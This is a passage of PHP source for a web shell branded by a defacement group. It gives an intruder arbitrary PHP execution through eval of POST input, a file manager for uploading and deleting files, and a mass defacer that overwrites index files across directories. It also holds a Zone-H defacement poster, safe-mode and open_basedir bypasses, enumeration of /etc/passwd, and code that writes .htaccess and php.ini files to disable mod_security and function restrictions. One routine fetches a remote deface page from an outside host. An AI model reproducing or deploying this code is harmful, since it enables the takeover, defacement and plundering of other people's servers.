			<font size="30" color="red" face="calibri"> Team Pak Cyber Ghosts [P.C.G]</font><iframe src="https://www.youtube.com/embed/nPGIdTAeOSg?rel=0&autoplay=1&loop=1&playlist=nPGIdTAeOSg" allowfullscreen="" frameborder="0" height="0" width="0"></iframe><body bgcolor="black"><center><script language="JavaScript1.2">function ejs_nodroit(){alert(' Pakistan Zindabad <3 ');return(false);}document.oncontextmenu = ejs_nodroit;</script><br><br><font size="5" color="white" face="calibri"> Pakistan Zindabad  </font><br><br><br><font size="5" color="white" face="calibri"> Greetz ~<marquee width="80%"># Shariq Maik | # Prinxe Haxi | # An0n 3xPloiTeR | # Unknown | # Wahab Hacker | # Rizi Haxor | # 8R0K3N H34R7 | # CYB3R71 | # 3htisham | # And All Muslims</marquee></font><br></center>
		</body>
	</html></textarea>  
<br><input type=submit value="Update"></p></form>

<?php
                                                                    if ($_POST['a'] == 'Deface') {
                                                                        $mainpath = $_POST[p1];
                                                                        $file = $_POST[p2];
                                                                        $txtContents = $_POST[p3];
                                                                        echo "-----------------------------------------------<br>
[+] Single user Mass defacer [+]<br>
-----------------------------------------------<br><br> ";
                                                                        $dir = opendir($mainpath); //fixme - cannot deface when change to writeable path!!
                                                                        while ($row = readdir($dir)) {
                                                                            $start = @fopen("$row/$file", "w");
                                                                            $code = $txtContents;
                                                                            $finish = @fwrite($start, $code);
                                                                            if ($finish) {
                                                                                echo "$row/$file > Done<br><br>";
                                                                            }
                                                                        }
                                                                        echo "-----------------------------------------------<br><br>[+] Script by An0n 3xPloiTeR [+]";
                                                                    }
                                                                    echo '</div>';
                                                                    An0n3xPloiTeRFooter();

 

                                                                }
																function actionZHposter() {
                                                                    An0n3xPloiTeRHeader();
                                                                    echo '<center><h1>Zone-H Poster</h1></center></center><br><div class=content>';
                                                                    echo '<form action="" method="post" onSubmit=da2(null,null,this.p1.value,this.p2.value,this.p3.value,this.p4.value);return true;">
<input type="text" name="p1" size="40" value="An0n 3xPloiTeR" /></br>
<select name="p2">
<option >--------SELECT--------</option>
<option value="1">known vulnerability (i.e. unpatched system)</option>
<option value="2" >undisclosed (new) vulnerability</option>
<option value="3" >configuration / admin. mistake</option>
<option value="4" >brute force attack</option>
<option value="5" >social engineering</option>
<option value="6" >Web Server intrusion</option>
<option value="7" >Web Server external module intrusion</option>
<option value="8" >Mail Server intrusion</option>
<option value="9" >FTP Server intrusion</option>
<option value="10" >SSH Server intrusion</option>
<option value="11" >Telnet Server intrusion</option>
<option value="12" >RPC Server intrusion</option>
<option value="13" >Shares misconfiguration</option>
<option value="14" >Other Server intrusion</option>
<option value="15" >SQL Injection</option>
<option value="16" >URL Poisoning</option>
<option value="17" >File Inclusion</option>
<option value="18" >Other Web Application bug</option>
<option value="19" >Remote administrative panel access bruteforcing</option>
<option value="20" >Remote administrative panel access password guessing</option>
<option value="21" >Remote administrative panel access social engineering</option>
<option value="22" >Attack against administrator(password stealing/sniffing)</option>
<option value="23" >Access credentials through Man In the Middle attack</option>
<option value="24" >Remote service password guessing</option>
<option value="25" >Remote service password bruteforce</option>
<option value="26" >Rerouting after attacking the Firewall</option>
<option value="27" >Rerouting after attacking the Router</option>
<option value="28" >DNS attack through social engineering</option>
<option value="29" >DNS attack through cache poisoning</option>
<option value="30" >Not available</option>
</select>
</br>
<select name="p3">
<option >--------SELECT--------</option>
<option value="1" >Heh...just for fun!</option>
<option value="2" >Revenge against that website</option>
<option value="3" >Political reasons</option>
<option value="4" >As a challenge</option>
<option value="5" >I just want to be the best defacer</option>
<option value="6" >Patriotism</option>
<option value="7" >Not available</option>
</select>
</br>
<textarea name="p4" cols="44" rows="9">List Of Domains</textarea>
<input type="submit" value="Send Now !" />
</form>';
                                                                    echo "</td></tr></table></form>";
                                                                    if ($_POST['a'] == 'ZHposter') {
                                                                        ob_start();
                                                                        $sub = @get_loaded_extensions();
                                                                        if (!in_array("curl", $sub)) {
                                                                            die('[-] Curl Is Not Supported !! ');
                                                                        }
                                                                        $hacker9 = $_POST['p1'];
                                                                        $method9 = $_POST['p2'];
                                                                        $neden9 = $_POST['p3'];
                                                                        $site9 = $_POST['p4'];
                                                                        if (empty($hacker9)) {
                                                                            die("[-] You Must Fill the Attacker name !");
                                                                        } elseif ($method9 == "--------SELECT--------") {
                                                                            die("[-] You Must Select The Method !");
                                                                        } elseif ($neden9 == "--------SELECT--------") {
                                                                            die("[-] You Must Select The Reason");
                                                                        } elseif (empty($site9)) {
                                                                            die("[-] You Must Inter the Sites List ! ");
                                                                        }
                                                                        $i = 0;
                                                                        $sites = explode("
", $site9);
                                                                        while ($i < count($sites)) {
                                                                            if (substr($sites[$i], 0, 4) != "http") {
                                                                                $sites[$i] = "http://" . $sites[$i];
                                                                            }
                                                                            ZoneH("http://zone-h.org/notify/single", $hacker9, $method9, $neden9, $sites[$i]);
                                                                            echo "Site : " . $sites[$i] . " Defaced ! </br>";
                                                                            ++$i;
                                                                        }
                                                                        echo "[+] Sending Sites To Zone-H Has Been Completed Successfully !! ";
                                                                    }
                                                                    echo '</div></center>';
                                                                    An0n3xPloiTeRFooter();
                                                                }
	

function actionAbout() {
	An0n3xPloiTeRHeader();

echo "
<style>
	.font{
		text-transform: capitalize;
		text-align: center;
	}
</style>
<center>
<h1>About Me</h1>
<h2><a href='https://www.google.com/search?q=An0n 3xPloiTeR'><q>An0n 3xPloiTeR</q></a></h2>
<div class='font'><span>
                                        I'm a 15 years old security and hacking fan. I like to understand things in depth, for me, the real knowledge is not defacing, I now think you'll waste your time, by putting a page<br>
                                                        <q>Hacked by An0n 3xPloiTeR, None system is secure</q><br> the real knowledge in hacking has no limits, for me the real hacking is a way of thinking.<br> a way of liking understanding things in depth, <br> like learning C language (PHP has mainly been coded in C,
                                                        your operating system has mainly been coded in C).<br> A real hacker knows his computer's secrets, defacing is a shame on this world, however, it's one of my interest and favourite one's :P<br></span>
                                                        <span><font>Greetz ~<marquee width='80%''># Shariq Maik | # Prinxe Haxi | # Devil Killer | # Ghazif Adeem | # An0n 3xPloiTeR | # Zero Cool | # Wahab Hacker | # Rizi Haxor | # 8R0K3N H34R7 | # CYB3R71 | # 3htisham | # And All Muslim Hackers <3 </marquee></span></font></span></div></center>
                                                       ";

	An0n3xPloiTeRFooter();
}


 function actionSafeMode() {
            $temp='';
            ob_start();
            switch($_POST['p1']) {
                    case 1:
                            $temp=@tempnam($test, 'cx');
                            if(@copy("compress.zlib://".$_POST['p2'], $temp)){
                                    echo @file_get_contents($temp);
                                    unlink($temp);
                            } else
                                    echo 'Sorry... Can\'t open file';
                            break;
                    case 2:
                            $files = glob($_POST['p2'].'*');
                            if( is_array($files) )
                                    foreach ($files as $filename)
                                            echo $filename."\n";
                            break;
                    case 3:
                            $ch = curl_init("file://".$_POST['p2']."\x00".preg_replace('!\(\d+\)\s.*!', '', __FILE__));
                            curl_exec($ch);
                            break;
                    case 4:
                            ini_restore("safe_mode");
                            ini_restore("open_basedir");
                            include($_POST['p2']);
                            break;
                    case 5:
                            for(;$_POST['p2'] <= $_POST['p3'];$_POST['p2']++) {
                                    $uid = @posix_getpwuid($_POST['p2']);
                                    if ($uid)
                                            echo join(':',$uid)."\n";
                            }
                            break;
            }
            $temp = ob_get_clean();
            An0n3xPloiTeRHeader();
            echo '<center><h1>Safe mode bypass</h1></center><center><div class=content>';
            echo '<span>Copy (read file)</span><form onsubmit=\'g(null,null,"1",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Glob (list dir)</span><form onsubmit=\'g(null,null,"2",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Curl (read file)</span><form onsubmit=\'g(null,null,"3",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Ini_restore (read file)</span><form onsubmit=\'g(null,null,"4",this.param.value);return false;\'><input type=text name=param><input type=submit value=">>"></form><br><span>Posix_getpwuid ("Read" /etc/passwd)</span><table><form onsubmit=\'g(null,null,"5",this.param1.value,this.param2.value);return false;\'><tr><td>From</td><td><input type=text name=param1 value=0></td></tr><tr><td>To</td><td><input type=text name=param2 value=1000></td></tr></table><input type=submit value=">>"></form>';
            if($temp)
                    echo '<pre class="ml1" style="margin-top:5px" id="Output">'.htmlspecialchars($temp).'</pre>';
            echo '</div><br>';
            echo '<h1>Safe Mode</h1>';
    echo '<div class="content">';
    echo "<div class=header><center><h3><span>| SAFE MODE AND MOD SECURITY DISABLED AND PERL 500 INTERNAL ERROR BYPASS |</span></h3>Following php.ini and .htaccess(mod) and perl(.htaccess)[convert perl extention *.pl => *.sh  ] files create in following dir<br>| ".$GLOBALS['cwd']." |<br><br />";
    echo '<a href=# onclick="g(null,null,\'php.ini\',null)">| PHP.INI | </a><a href=# onclick="g(null,null,null,\'ini\')">| .htaccess(Mod) | </a><a href=# onclick="g(null,null,null,null,\'sh\')">| .htaccess(perl) | </a></center>';
    if(!empty($_POST['p2']) && isset($_POST['p2']))
    {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'<IfModule mod_security.c>
            Sec------Engine Off
            Sec------ScanPOST Off
            </IfModule>');
        fclose($fil);
   }
   if(!empty($_POST['p1'])&& isset($_POST['p1']))
   {
        $fil=fopen($GLOBALS['cwd']."php.ini","w");
        fwrite($fil,'safe_mode=OFF
            disable_functions=NONE');
        fclose($fil);
    }
    if(!empty($_POST['p3']) && isset($_POST['p3']))
    {
        $fil=fopen($GLOBALS['cwd'].".htaccess","w");
        fwrite($fil,'Options FollowSymLinks MultiViews Indexes ExecCGI
        AddType application/x-httpd-cgi .sh
        AddHandler cgi-script .pl
        AddHandler cgi-script .pl');
        fclose($fil); 
    }
    echo "<br><br /><br /></div>";
    echo '</div>';
            An0n3xPloiTeRFooter();
    }
function actionPhp() {
	if(isset($_POST['ajax'])) {
        An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
		ob_start();
		eval($_POST['p1']);
		$temp = "document.getElementById('PhpOutput').style.display='';document.getElementById('PhpOutput').innerHTML='" . addcslashes(htmlspecialchars(ob_get_clean()), "\n\r\t\\'\0") . "';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax']) && !empty($_POST['p1']))
        An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);

	An0n3xPloiTeRHeader();
	if(isset($_POST['p2']) && ($_POST['p2'] == 'info')) {
		echo '<h1>PHP info</h1><div class=content><style>.p {color:#000;}</style>';
		ob_start();
		phpinfo();
		$tmp = ob_get_clean();
        $tmp = preg_replace(array (
            '!(body|a:\w+|body, td, th, h1, h2) {.*}!msiU',
            '!td, th {(.*)}!msiU',
            '!<img[^>]+>!msiU',
        ), array (
            '',
            '.e, .v, .h, .h th {$1}',
            ''
        ), $tmp);
		echo str_replace('<h1','<h2', $tmp) .'</div><br>';
	}
    echo '<center><h1>Execution PHP-code</h1></center><div class=content><form name=pf method=post onsubmit="if(this.ajax.checked){a(\'Php\',null,this.code.value);}else{g(\'Php\',null,this.code.value,\'\');}return false;"><textarea name=code class=bigarea id=PhpCode>'.(!empty($_POST['p1'])?htmlspecialchars($_POST['p1']):'').'</textarea><input type=submit value=Eval style="margin-top:5px">';
	echo ' <input type=checkbox name=ajax value=1 '.($_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'').'> send using AJAX</form><pre id=PhpOutput style="'.(empty($_POST['p1'])?'display:none;':'').'margin-top:5px;" class=ml1>';
	if(!empty($_POST['p1'])) {
		ob_start();
		eval($_POST['p1']);
		echo htmlspecialchars(ob_get_clean());
	}
	echo '</pre></div>';
	An0n3xPloiTeRFooter();
}

function actionFilesMan() {
    if (!empty ($_COOKIE['f']))
        $_COOKIE['f'] = @unserialize($_COOKIE['f']);
    
	if(!empty($_POST['p1'])) {
		switch($_POST['p1']) {
			case 'uploadFile':
				if(!@move_uploaded_file($_FILES['f']['tmp_name'], $_FILES['f']['name']))
					echo "Can't upload!";
				break;
			case 'mkdir':
				if(!@mkdir($_POST['p2']))
					echo "Can't create!";
				break;
			case 'delete':
				function deleteDir($path) {
					$path = (substr($path,-1)=='/') ? $path:$path.'/';
					$dh  = opendir($path);
					while ( ($item = readdir($dh) ) !== false) {
						$item = $path.$item;
						if ( (basename($item) == "..") || (basename($item) == ".") )
							continue;
						$type = filetype($item);
						if ($type == "dir")
							deleteDir($item);
						else
							@unlink($item);
					}
					closedir($dh);
					@rmdir($path);
				}
				if(is_array(@$_POST['f']))
					foreach($_POST['f'] as $f) {
                        if($f == '..')
                            continue;
						$f = urldecode($f);
						if(is_dir($f))
							deleteDir($f);
						else
							@unlink($f);
					}
				break;
			case 'paste':
				if($_COOKIE['act'] == 'copy') {
					function copy_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != ".."))
									copy_paste($c.$s.'/',$f, $d.$s.'/');
						} elseif(is_file($c.$s))
							@copy($c.$s, $d.$s);
					}
					foreach($_COOKIE['f'] as $f)
						copy_paste($_COOKIE['c'],$f, $GLOBALS['cwd']);
				} elseif($_COOKIE['act'] == 'move') {
					function move_paste($c,$s,$d){
						if(is_dir($c.$s)){
							mkdir($d.$s);
							$h = @opendir($c.$s);
							while (($f = @readdir($h)) !== false)
								if (($f != ".") and ($f != ".."))
									copy_paste($c.$s.'/',$f, $d.$s.'/');
						} elseif(@is_file($c.$s))
							@copy($c.$s, $d.$s);
					}
					foreach($_COOKIE['f'] as $f)
						@rename($_COOKIE['c'].$f, $GLOBALS['cwd'].$f);
				} elseif($_COOKIE['act'] == 'zip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        if ($zip->open($_POST['p2'], 1)) {
                            chdir($_COOKIE['c']);
                            foreach($_COOKIE['f'] as $f) {
                                if($f == '..')
                                    continue;
                                if(@is_file($_COOKIE['c'].$f))
                                    $zip->addFile($_COOKIE['c'].$f, $f);
                                elseif(@is_dir($_COOKIE['c'].$f)) {
                                    $iterator = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($f.'/', FilesystemIterator::SKIP_DOTS));
                                    foreach ($iterator as $key=>$value) {
                                        $zip->addFile(realpath($key), $key);
                                    }
                                }
                            }
                            chdir($GLOBALS['cwd']);
                            $zip->close();
                        }
                    }
				} elseif($_COOKIE['act'] == 'unzip') {
					if(class_exists('ZipArchive')) {
                        $zip = new ZipArchive();
                        foreach($_COOKIE['f'] as $f) {
                            if($zip->open($_COOKIE['c'].$f)) {
                                $zip->extractTo($GLOBALS['cwd']);
                                $zip->close();
                            }
                        }
                    }
				} elseif($_COOKIE['act'] == 'tar') {
                    chdir($_COOKIE['c']);
                    $_COOKIE['f'] = array_map('escapeshellarg', $_COOKIE['f']);
                    An0n3xPloiTeREx('tar cfzv ' . escapeshellarg($_POST['p2']) . ' ' . implode(' ', $_COOKIE['f']));
                    chdir($GLOBALS['cwd']);
				}
				unset($_COOKIE['f']);
                setcookie('f', '', time() - 3600);
				break;
			default:
                if(!empty($_POST['p1'])) {
					An0n3xPloiTeRsetcookie('act', $_POST['p1']);
					An0n3xPloiTeRsetcookie('f', serialize(@$_POST['f']));
					An0n3xPloiTeRsetcookie('c', @$_POST['c']);
				}
				break;
		}
	}
    An0n3xPloiTeRHeader();
	echo '<center><h1>File manager</h1></center><div class=content><script>p1_=p2_=p3_="";</script>';
	if(isset($_POST['p1']) && $_POST['p1']=='deface') {
        $def = file_get_contents('http://hexinjector.cu.ma/pwd/deface.php');
        file_put_contents($_POST['c'].$_POST['p2'],$def);
    }
	$dirContent = An0n3xPloiTeRScandir(isset($_POST['c'])?$_POST['c']:$GLOBALS['cwd']);
	if($dirContent === false) {	echo 'Can\'t open this folder!';An0n3xPloiTeRFooter(); return; }
	global $sort;
	$sort = array('name', 1);
	if(!empty($_POST['p1'])) {
		if(preg_match('!s_([A-z]+)_(\d{1})!', $_POST['p1'], $match))
			$sort = array($match[1], (int)$match[2]);
	}
echo "<script>
	function sa() {
		for(i=0;i<d.files.elements.length;i++)
			if(d.files.elements[i].type == 'checkbox')
				d.files.elements[i].checked = d.files.elements[0].checked;
	}
</script>
<table width='100%' class='main' cellspacing='0' cellpadding='2'>
<form name=files method=post><tr><th width='13px'><input type=checkbox onclick='sa()' class=chkbx></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_name_".($sort[1]?0:1)."\")'>Name</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_size_".($sort[1]?0:1)."\")'>Size</a></th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_modify_".($sort[1]?0:1)."\")'>Modify</a></th><th>Owner/Group</th><th><a href='#' onclick='g(\"FilesMan\",null,\"s_perms_".($sort[1]?0:1)."\")'>Permissions</a></th><th>Actions</th></tr>";
	$dirs = $files = array();
	$n = count($dirContent);
	for($i=0;$i<$n;$i++) {
		$ow = @posix_getpwuid(@fileowner($dirContent[$i]));
		$gr = @posix_getgrgid(@filegroup($dirContent[$i]));
		$tmp = array('name' => $dirContent[$i],
					 'path' => $GLOBALS['cwd'].$dirContent[$i],
					 'modify' => date('Y-m-d H:i:s', @filemtime($GLOBALS['cwd'] . $dirContent[$i])),
					 'perms' => An0n3xPloiTeRPermsColor($GLOBALS['cwd'] . $dirContent[$i]),
					 'size' => @filesize($GLOBALS['cwd'].$dirContent[$i]),
					 'owner' => $ow['name']?$ow['name']:@fileowner($dirContent[$i]),
					 'group' => $gr['name']?$gr['name']:@filegroup($dirContent[$i])
					);
		if(@is_file($GLOBALS['cwd'] . $dirContent[$i]))
			$files[] = array_merge($tmp, array('type' => 'file'));
		elseif(@is_link($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'link', 'link' => readlink($tmp['path'])));
		elseif(@is_dir($GLOBALS['cwd'] . $dirContent[$i]))
			$dirs[] = array_merge($tmp, array('type' => 'dir'));
	}
	$GLOBALS['sort'] = $sort;
	function An0n3xPloiTeRCmp($a, $b) {
		if($GLOBALS['sort'][0] != 'size')
			return strcmp(strtolower($a[$GLOBALS['sort'][0]]), strtolower($b[$GLOBALS['sort'][0]]))*($GLOBALS['sort'][1]?1:-1);
		else
			return (($a['size'] < $b['size']) ? -1 : 1)*($GLOBALS['sort'][1]?1:-1);
	}
	usort($files, "An0n3xPloiTeRCmp");
	usort($dirs, "An0n3xPloiTeRCmp");
	$files = array_merge($dirs, $files);
	$l = 0;
	foreach($files as $f) {
		echo '<tr'.($l?' class=l1':'').'><td><input type=checkbox name="f[]" value="'.urlencode($f['name']).'" class=chkbx></td><td><a href=# onclick="'.(($f['type']=='file')?'g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'view\')">'.htmlspecialchars($f['name']):'g(\'FilesMan\',\''.$f['path'].'\');" ' . (empty ($f['link']) ? '' : "title='{$f['link']}'") . '><b>[ ' . htmlspecialchars($f['name']) . ' ]</b>').'</a></td><td>'.(($f['type']=='file')?An0n3xPloiTeRViewSize($f['size']):$f['type']).'</td><td>'.$f['modify'].'</td><td>'.$f['owner'].'/'.$f['group'].'</td><td><a href=# onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\',\'chmod\')">'.$f['perms']
			.'</td><td><a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'rename\')">R</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'touch\')">T</a>'.(($f['type']=='file')?' <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'edit\')">E</a> <a href="#" onclick="g(\'FilesTools\',null,\''.urlencode($f['name']).'\', \'download\')">D</a>':'').'</td></tr>';
		$l = $l?0:1;
	}
	echo "<tr><td colspan=5>
	<input type=hidden name=a value='FilesMan'>
	<input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) ."'>
	<input type=hidden name=charset value='". (isset($_POST['charset'])?$_POST['charset']:'')."'>
	<select name='p1'><option value='copy'>Copy</option><option value='move'>Move</option><option value='delete'>Delete</option>";
    if(class_exists('ZipArchive'))
        echo "<option value='zip'>Compress (zip)</option><option value='unzip'>Uncompress (zip)</option>";
    echo "<option value='tar'>Compress (tar.gz)</option>";
    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']))
        echo "<option value='paste'>Paste / Compress</option>";
    echo "</select>&nbsp;";
    if(!empty($_COOKIE['act']) && @count($_COOKIE['f']) && (($_COOKIE['act'] == 'zip') || ($_COOKIE['act'] == 'tar')))
        echo "file name: <input type=text name=p2 value='An0n3xPloiTeR_" . date("Ymd_His") . "." . ($_COOKIE['act'] == 'zip'?'zip':'tar.gz') . "'>&nbsp;";
    echo '</select>&nbsp;<input type="submit" value=">>"></td><br><td colspan="2" align="right" width="1">&nbsp;</td></tr>
    </form></table></div>';
	An0n3xPloiTeRFooter();
}
                                                                          
function actionShells() {
	An0n3xPloiTeRheader();


echo '<center><h1>Shells By An0n 3xPloiTeR</h1></center><div class="content">
<br>
<table border="1%" align="center" cellpadding="10">
<tr>
<td>Click And Get The Shells</td>
<tr><td>
<form action="" method="post"> 
<input type = "submit" name="dhanush" value ="Dhanush Shell">
</td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="anonghosts" value ="AnonGhosts Shell"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="blackhat" value ="BlackHat Shell"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="imageshell" value ="An0n 3xPloiTeR Image Shell"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="madspot" value ="Madspot Shell"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="pcd" value ="Pak Cyber Defenders Shell"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="cheta" value ="Kashimiri Cheetah Shell"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="1337worm" value ="1337 Worm Shell"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="b374k" value ="b374k Shell"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="joker" value ="Joker Shell"></td></tr></div>';
	An0n3xPloiTeRFooter();
}

function actionTools(){
	An0n3xPloiTeRHeader();

echo '<center><h1>Tools By An0n 3xPloiTeR</h1></center><div class="content">
<br>
<table border="1%" align="center" cellpadding="10">
<tr>
<td>Click And Get The Tools</td>
<tr><td>
<form action="" method="post">
<input type = "submit" name="symlink" value ="Symlinker"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="uploader" value ="Uploader By An0n 3xPloiTeR"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="mass" value ="Mass Defacer"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="anoncmd" value ="AnonGhosts Console"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="madleets" value ="Madleets Console"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="rooter" value ="Autorooting Perl Script"></td></tr>
<tr><td>
<form action="" method="post">
<input type = "submit" name="cpc" value ="Control Panel Cracker"></td></tr></div>';
	An0n3xPloiTeRFooter();
}


function actionPortScanner() {
    An0n3xPloiTeRHeader();
    echo '<center><h1>Port Scanner</h1></center>';
    echo '<div class="content">';
    echo '<form action="" method="post">';
    
    if(isset($_POST['host']) && is_numeric($_POST['end']) && is_numeric($_POST['start'])){
        $start = strip_tags($_POST['start']);
        $end = strip_tags($_POST['end']);
        $host = strip_tags($_POST['host']);
        for($i = $start; $i<=$end; $i++){
            $fp = @fsockopen($host, $i, $errno, $errstr, 3);
            if($fp){
                echo 'Port '.$i.' is <font color=green>open</font><br>';
            }
            flush();
        }
    } else {
        echo '<br /><br /><center><input type="hidden" name="a" value="PortScanner"><input type="hidden" name=p1><input type="hidden" name="p2">
              <input type="hidden" name="c" value="'.htmlspecialchars($GLOBALS['cwd']).'">
              <input type="hidden" name="charset" value="'.(isset($_POST['charset'])?$_POST['charset']:'').'">
              Host: <input type="text" name="host" value="localhost"/><br /><br />
              Port start: <input type="text" name="start" value="0"/><br /><br />
              Port end:<input type="text" name="end" value="5000"/><br /><br />
              <input type="submit" value="ScanPorts" />
              </form></center><br /><br />';
    }
    echo '</div>';
    An0n3xPloiTeRFooter();    
}
function actionStringTools() {
	if(!function_exists('hex2bin')) {function hex2bin($p) {return decbin(hexdec($p));}}
    if(!function_exists('binhex')) {function binhex($p) {return dechex(bindec($p));}}
	if(!function_exists('hex2ascii')) {function hex2ascii($p){$r='';for($i=0;$i<strLen($p);$i+=2){$r.=chr(hexdec($p[$i].$p[$i+1]));}return $r;}}
	if(!function_exists('ascii2hex')) {function ascii2hex($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= sprintf('%02X',ord($p[$i]));return strtoupper($r);}}
	if(!function_exists('full_urlencode')) {function full_urlencode($p){$r='';for($i=0;$i<strlen($p);++$i)$r.= '%'.dechex(ord($p[$i]));return strtoupper($r);}}
	$stringTools = array(
		'Base64 encode' => 'base64_encode',
		'Base64 decode' => 'base64_decode',
		'Url encode' => 'urlencode',
		'Url decode' => 'urldecode',
		'Full urlencode' => 'full_urlencode',
		'md5 hash' => 'md5',
		'sha1 hash' => 'sha1',
		'crypt' => 'crypt',
		'CRC32' => 'crc32',
		'ASCII to HEX' => 'ascii2hex',
		'HEX to ASCII' => 'hex2ascii',
		'HEX to DEC' => 'hexdec',
		'HEX to BIN' => 'hex2bin',
		'DEC to HEX' => 'dechex',
		'DEC to BIN' => 'decbin',
		'BIN to HEX' => 'binhex',
		'BIN to DEC' => 'bindec',
		'String to lower case' => 'strtolower',
		'String to upper case' => 'strtoupper',
		'Htmlspecialchars' => 'htmlspecialchars',
		'String length' => 'strlen',
	);
	if(isset($_POST['ajax'])) {
		An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', true);
		ob_start();
		if(in_array($_POST['p1'], $stringTools))
			echo $_POST['p1']($_POST['p2']);
		$temp = "document.getElementById('strOutput').style.display='';document.getElementById('strOutput').innerHTML='".addcslashes(htmlspecialchars(ob_get_clean()),"\n\r\t\\'\0")."';\n";
		echo strlen($temp), "\n", $temp;
		exit;
	}
    if(empty($_POST['ajax'])&&!empty($_POST['p1']))
		An0n3xPloiTeRsetcookie(md5($_SERVER['HTTP_HOST']).'ajax', 0);
	An0n3xPloiTeRHeader();
	echo '<center><h1>String conversions</h1></center><div class=content>';
	echo "<form name='toolsForm' onSubmit='if(this.ajax.checked){a(null,null,this.selectTool.value,this.input.value);}else{g(null,null,this.selectTool.value,this.input.value);} return false;'><select name='selectTool'>";
	foreach($stringTools as $k => $v)
		echo "<option value='".htmlspecialchars($v)."'>".$k."</option>";
		echo "</select><input type='submit' value='>>'/> <input type=checkbox name=ajax value=1 ".(@$_COOKIE[md5($_SERVER['HTTP_HOST']).'ajax']?'checked':'')."> send using AJAX<br><textarea name='input' style='margin-top:5px' class=bigarea>".(empty($_POST['p1'])?'':htmlspecialchars(@$_POST['p2']))."</textarea></form><pre class='ml1' style='".(empty($_POST['p1'])?'display:none;':'')."margin-top:5px' id='strOutput'>";
	if(!empty($_POST['p1'])) {
		if(in_array($_POST['p1'], $stringTools))echo htmlspecialchars($_POST['p1']($_POST['p2']));
	}
	echo"</pre></div><br><h1>Search files:</h1><div class=content>
		<form onsubmit=\"g(null,this.cwd.value,null,this.text.value,this.filename.value);return false;\"><table cellpadding='1' cellspacing='0' width='50%'>
			<tr><td width='1%'>Text:</td><td><input type='text' name='text' style='width:100%'></td></tr>
			<tr><td>Path:</td><td><input type='text' name='cwd' value='". htmlspecialchars($GLOBALS['cwd']) ."' style='width:100%'></td></tr>
			<tr><td>Name:</td><td><input type='text' name='filename' value='*' style='width:100%'></td></tr>
			<tr><td></td><td><input type='submit' value='>>'></td></tr>
			</table></form>";

	function An0n3xPloiTeRRecursiveGlob($path) {
		if(substr($path, -1) != '/')
			$path.='/';
		$paths = @array_unique(@array_merge(@glob($path.$_POST['p3']), @glob($path.'*', GLOB_ONLYDIR)));
		if(is_array($paths)&&@count($paths)) {
			foreach($paths as $item) {
				if(@is_dir($item)){
					if($path!=$item)
						An0n3xPloiTeRRecursiveGlob($item);
				} else {
					if(empty($_POST['p2']) || @strpos(file_get_contents($item), $_POST['p2'])!==false)
						echo "<a href='#' onclick='g(\"FilesTools\",null,\"".urlencode($item)."\", \"view\",\"\")'>".htmlspecialchars($item)."</a><br>";
				}
			}
		}
	}
	if(@$_POST['p3'])
		An0n3xPloiTeRRecursiveGlob($_POST['c']);
	echo "</div><br><h1>Search for hash:</h1><div class=content>
		<form method='post' target='_blank' name='hf'>
			<input type='text' name='hash' style='width:200px;'><br>
            <input type='hidden' name='act' value='find'/>
			<input type='button' value='hashcracking.ru' onclick=\"document.hf.action='https://hashcracking.ru/index.php';document.hf.submit()\"><br>
			<input type='button' value='md5.rednoize.com' onclick=\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.value+'&s=md5';document.hf.submit()\"><br>
            <input type='button' value='crackfor.me' onclick=\"document.hf.action='http://crackfor.me/index.php';document.hf.submit()\"><br>
		</form></div>";
	An0n3xPloiTeRFooter();
}

function actionFilesTools() {
	if( isset($_POST['p1']) )
		$_POST['p1'] = urldecode($_POST['p1']);
	if(@$_POST['p2']=='download') {
		if(@is_file($_POST['p1']) && @is_readable($_POST['p1'])) {
			ob_start("ob_gzhandler", 4096);
			header("Content-Disposition: attachment; filename=".basename($_POST['p1']));
			if (function_exists("mime_content_type")) {
				$type = @mime_content_type($_POST['p1']);
				header("Content-Type: " . $type);
			} else
                header("Content-Type: application/octet-stream");
			$fp = @fopen($_POST['p1'], "r");
			if($fp) {
				while(!@feof($fp))
					echo @fread($fp, 1024);
